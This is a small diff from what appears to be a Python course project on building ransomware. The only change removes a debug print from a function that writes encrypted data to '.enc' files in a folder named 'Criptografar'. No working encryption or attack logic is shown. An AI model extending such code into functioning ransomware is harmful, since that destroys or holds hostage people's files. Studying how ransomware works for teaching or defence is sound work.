@@ -15,7 +15,6 @@ def GravaNovoArquivo(txt, root, file):
     # sourcery skip: use-fstring-for-concatenation
    with open(os.path.join(root, file) + '.enc', 'wb') as f:
        f.write(txt)
-       print(type(f))
 
 if __name__ == "__main__":
     path = r'C:\Users\guigu\Desktop\Projetos Digital Innovation One\Projetos-Digital-Innovation-One\Criando um ransoware em Python\Criptografar'
